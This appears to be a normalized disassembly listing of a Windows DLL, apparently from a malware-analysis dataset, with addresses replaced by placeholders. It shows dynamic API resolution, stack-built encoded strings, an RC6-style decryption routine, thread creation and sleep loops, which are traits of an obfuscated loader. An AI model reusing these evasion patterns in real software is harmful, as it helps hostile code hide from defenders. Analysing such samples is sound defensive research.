push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x5
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x1c ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ ebp - 0x1c ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push 0x1
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ ebp - 0x14 ] 0x6d
mov [ ebp - 0x13 ] 0xf9
mov [ ebp - 0x12 ] 0x33
mov [ ebp - 0x11 ] 0x4e
mov [ ebp - 0x10 ] 0xb1
mov [ ebp - 0xf ] 0x79
mov [ ebp - 0xe ] 0x54
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0xd4
push rw-data
call sub_1000138e
mov [ rw-data ] rw-data
mov [ ebp - 0x20 ] rw-data
push 0x104
push 0x8
push [ rw-data ]
call [ rw-data ]
mov [ ebp - 0x18 ] eax
push [ ebp - 0x18 ]
push 0x104
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push [ ebp - 0x18 ]
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push [ ebp - 0x18 ]
push 0x0
push [ rw-data ]
call [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x0
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push 0x104
push 0x8
push [ rw-data ]
call [ rw-data ]
mov [ rw-data ] eax
push [ ebp - 0x20 ]
movzx eax [ ebp - 0x9 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xb ]
push eax
movzx eax [ ebp - 0xc ]
push eax
push rw-data
push [ rw-data ]
call [ rw-data ]
add esp 0x1c
call sub_1000155f
mov [ ebp - 0x8 ] eax
push 0xffffffff
push [ ebp - 0x8 ]
call [ rw-data ]
push [ rw-data ]
push 0x0
push [ rw-data ]
call [ rw-data ]
push 0x1
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
push 0x7
push rw-data
call sub_10001e1b
test eax eax
je r-xdata
push 0x493e0
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
pop eax
test eax eax
je r-xdata
_start
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x43
dec eax
mov [ ebp - 0x7 ] 0x7a
mov [ ebp - 0x6 ] 0x9d
mov [ ebp - 0x5 ] 0x36
mov [ ebp - 0x4 ] 0xe8
mov [ ebp - 0x3 ] 0xd2
mov [ ebp - 0x2 ] 0x66
jne r-xdata
push 0x1
pop eax
leave
retn 0xc
push esi
push edi
lea eax [ ebp - 0x8 ]
xor edi edi
push eax
push edi
mov esi rw-data
push 0x231
push esi
call sub_1000138e
push esi
call [ LoadLibraryA@IAT ]
push rw-data
push eax
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push edi
push edi
push edi
push sub_10001f7c
push edi
push edi
mov [ rw-data ] eax
call eax
pop edi
mov [ rw-data ] eax
pop esi
sub_1000240f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x2b
mov [ eax ] 0xb7e15163
lea ecx [ eax + 0x4 ]
pop edx
mov esi [ ecx - 0x4 ]
sub esi 0x61c88647
mov [ ecx ] esi
add ecx 0x4
dec edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor ebx ebx
xor edi edi
xor esi esi
cmp ecx 0x2c
mov [ ebp - 0x4 ] ebx
ja r-xdata
lea ecx [ ecx + ecx * 2 ]
cmp ecx 0x1
jl r-xdata
push 0x2c
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0xc
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ eax + ebx * 4 ]
lea eax [ eax + ebx * 4 ]
add ecx edi
push 0x2c
add ecx esi
rol ecx 0x3
mov esi ecx
mov ecx [ ebp - 0x4 ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
mov edx [ eax + ecx * 4 ]
lea eax [ eax + ecx * 4 ]
add edx edi
lea ecx [ edi + esi ]
add edx esi
rol edx cl
pop ecx
mov edi edx
xor edx edx
mov [ eax ] edi
lea eax [ ebx + 0x1 ]
div ecx
mov eax [ ebp - 0x4 ]
inc eax
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
dec [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
jne r-xdata
mov eax [ ebp + 0x8 ]
sub_100024a9
push ebp
push edi
push esi
push ebx
cmp [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x14 ]
jle r-xdata
pop ebx
pop esi
pop edi
pop ebp
retn 0x10
mov ebp [ esp + 0x18 ]
lea esp [ esp ]
mov edi edi
mov ebx [ ecx ]
mov esi [ ecx + 0x8 ]
sub ebx [ ebp + 0xa8 ]
mov edx [ ecx + 0x4 ]
sub esi [ ebp + 0xac ]
mov edi [ ecx + 0xc ]
sub edx [ ebp + 0xa4 ]
sub edi [ ebp + 0xa0 ]
lea ecx [ esi + esi + 0x1 ]
imul ecx esi
lea eax [ ebx + ebx + 0x1 ]
rol ecx 0x5
imul eax ebx
ror edi cl
xchg ecx eax
rol ecx 0x5
ror edx cl
sub ebx [ ebp + 0x9c ]
xor edx eax
xor edi ecx
sub esi [ ebp + 0x98 ]
lea ecx [ edx + edx + 0x1 ]
imul ecx edx
lea eax [ edi + edi + 0x1 ]
rol ecx 0x5
imul eax edi
ror esi cl
xchg ecx eax
rol ecx 0x5
ror ebx cl
sub edi [ ebp + 0x94 ]
xor ebx eax
xor esi ecx
sub edx [ ebp + 0x90 ]
lea ecx [ ebx + ebx + 0x1 ]
imul ecx ebx
lea eax [ esi + esi + 0x1 ]
rol ecx 0x5
imul eax esi
ror edx cl
xchg ecx eax
rol ecx 0x5
ror edi cl
sub esi [ ebp + 0x8c ]
xor edi eax
xor edx ecx
sub ebx [ ebp + 0x88 ]
lea ecx [ edi + edi + 0x1 ]
imul ecx edi
lea eax [ edx + edx + 0x1 ]
rol ecx 0x5
imul eax edx
ror ebx cl
xchg ecx eax
rol ecx 0x5
ror esi cl
sub edx [ ebp + 0x84 ]
xor esi eax
xor ebx ecx
sub edi [ ebp + 0x80 ]
lea ecx [ esi + esi + 0x1 ]
imul ecx esi
lea eax [ ebx + ebx + 0x1 ]
rol ecx 0x5
imul eax ebx
ror edi cl
xchg ecx eax
rol ecx 0x5
ror edx cl
sub ebx [ ebp + 0x7c ]
xor edx eax
xor edi ecx
sub esi [ ebp + 0x78 ]
lea ecx [ edx + edx + 0x1 ]
imul ecx edx
lea eax [ edi + edi + 0x1 ]
rol ecx 0x5
imul eax edi
ror esi cl
xchg ecx eax
rol ecx 0x5
ror ebx cl
sub edi [ ebp + 0x74 ]
xor ebx eax
xor esi ecx
sub edx [ ebp + 0x70 ]
lea ecx [ ebx + ebx + 0x1 ]
imul ecx ebx
lea eax [ esi + esi + 0x1 ]
rol ecx 0x5
imul eax esi
ror edx cl
xchg ecx eax
rol ecx 0x5
ror edi cl
sub esi [ ebp + 0x6c ]
xor edi eax
xor edx ecx
sub ebx [ ebp + 0x68 ]
lea ecx [ edi + edi + 0x1 ]
imul ecx edi
lea eax [ edx + edx + 0x1 ]
rol ecx 0x5
imul eax edx
ror ebx cl
xchg ecx eax
rol ecx 0x5
ror esi cl
sub edx [ ebp + 0x64 ]
xor esi eax
xor ebx ecx
sub edi [ ebp + 0x60 ]
lea ecx [ esi + esi + 0x1 ]
imul ecx esi
lea eax [ ebx + ebx + 0x1 ]
rol ecx 0x5
imul eax ebx
ror edi cl
xchg ecx eax
rol ecx 0x5
ror edx cl
sub ebx [ ebp + 0x5c ]
xor edx eax
xor edi ecx
sub esi [ ebp + 0x58 ]
lea ecx [ edx + edx + 0x1 ]
imul ecx edx
lea eax [ edi + edi + 0x1 ]
rol ecx 0x5
imul eax edi
ror esi cl
xchg ecx eax
rol ecx 0x5
ror ebx cl
sub edi [ ebp + 0x54 ]
xor ebx eax
xor esi ecx
sub edx [ ebp + 0x50 ]
lea ecx [ ebx + ebx + 0x1 ]
imul ecx ebx
lea eax [ esi + esi + 0x1 ]
rol ecx 0x5
imul eax esi
ror edx cl
xchg ecx eax
rol ecx 0x5
ror edi cl
sub esi [ ebp + 0x4c ]
xor edi eax
xor edx ecx
sub ebx [ ebp + 0x48 ]
lea ecx [ edi + edi + 0x1 ]
imul ecx edi
lea eax [ edx + edx + 0x1 ]
rol ecx 0x5
imul eax edx
ror ebx cl
xchg ecx eax
rol ecx 0x5
ror esi cl
sub edx [ ebp + 0x44 ]
xor esi eax
xor ebx ecx
sub edi [ ebp + 0x40 ]
lea ecx [ esi + esi + 0x1 ]
imul ecx esi
lea eax [ ebx + ebx + 0x1 ]
rol ecx 0x5
imul eax ebx
ror edi cl
xchg ecx eax
rol ecx 0x5
ror edx cl
sub ebx [ ebp + 0x3c ]
xor edx eax
xor edi ecx
sub esi [ ebp + 0x38 ]
lea ecx [ edx + edx + 0x1 ]
imul ecx edx
lea eax [ edi + edi + 0x1 ]
rol ecx 0x5
imul eax edi
ror esi cl
xchg ecx eax
rol ecx 0x5
ror ebx cl
sub edi [ ebp + 0x34 ]
xor ebx eax
xor esi ecx
sub edx [ ebp + 0x30 ]
lea ecx [ ebx + ebx + 0x1 ]
imul ecx ebx
lea eax [ esi + esi + 0x1 ]
rol ecx 0x5
imul eax esi
ror edx cl
xchg ecx eax
rol ecx 0x5
ror edi cl
sub esi [ ebp + 0x2c ]
xor edi eax
xor edx ecx
sub ebx [ ebp + 0x28 ]
lea ecx [ edi + edi + 0x1 ]
imul ecx edi
lea eax [ edx + edx + 0x1 ]
rol ecx 0x5
imul eax edx
ror ebx cl
xchg ecx eax
rol ecx 0x5
ror esi cl
sub edx [ ebp + 0x24 ]
xor esi eax
xor ebx ecx
sub edi [ ebp + 0x20 ]
lea ecx [ esi + esi + 0x1 ]
imul ecx esi
lea eax [ ebx + ebx + 0x1 ]
rol ecx 0x5
imul eax ebx
ror edi cl
xchg ecx eax
rol ecx 0x5
ror edx cl
sub ebx [ ebp + 0x1c ]
xor edx eax
xor edi ecx
sub esi [ ebp + 0x18 ]
lea ecx [ edx + edx + 0x1 ]
imul ecx edx
lea eax [ edi + edi + 0x1 ]
rol ecx 0x5
imul eax edi
ror esi cl
xchg ecx eax
rol ecx 0x5
ror ebx cl
sub edi [ ebp + 0x14 ]
xor ebx eax
xor esi ecx
sub edx [ ebp + 0x10 ]
lea ecx [ ebx + ebx + 0x1 ]
imul ecx ebx
lea eax [ esi + esi + 0x1 ]
rol ecx 0x5
imul eax esi
ror edx cl
xchg ecx eax
rol ecx 0x5
ror edi cl
sub esi [ ebp + 0xc ]
xor edi eax
xor edx ecx
sub ebx [ ebp + 0x8 ]
lea ecx [ edi + edi + 0x1 ]
imul ecx edi
lea eax [ edx + edx + 0x1 ]
rol ecx 0x5
imul eax edx
ror ebx cl
xchg ecx eax
rol ecx 0x5
ror esi cl
xor ebx ecx
xor esi eax
mov eax [ esp + 0x1c ]
sub edx [ ebp ]
mov ecx [ esp + 0x14 ]
mov [ eax ] ebx
sub edi [ ebp + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0xc ] edi
mov [ eax + 0x8 ] esi
add eax 0x10
lea ecx [ ecx + 0x10 ]
mov [ esp + 0x1c ] eax
dec [ esp + 0x20 ]
mov [ esp + 0x14 ] ecx
jne r-xdata
sub_10002820
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10001315
push 0x2
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000240f
retn 0x8
sub_10001327
push [ esp + 0xc ]
push [ esp + 0x8 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_100024a9
retn 0xc
sub_1000155f
push ecx
lea eax [ esp ]
push eax
xor eax eax
push eax
push eax
push sub_10001530
push eax
push eax
call [ rw-data ]
pop ecx
retn
sub_100019f6
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
jmp eax
Init1
push 0x1388
call [ Sleep@IAT ]
push 0xffffffff
push [ rw-data ]
call [ rw-data ]
xor eax eax
retn
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
sub_10002850
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000285a
mov eax r--data
jmp __CxxFrameHandler
sub_10002864
push [ ebp - 0x120 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10002871
mov eax r--data
jmp __CxxFrameHandler
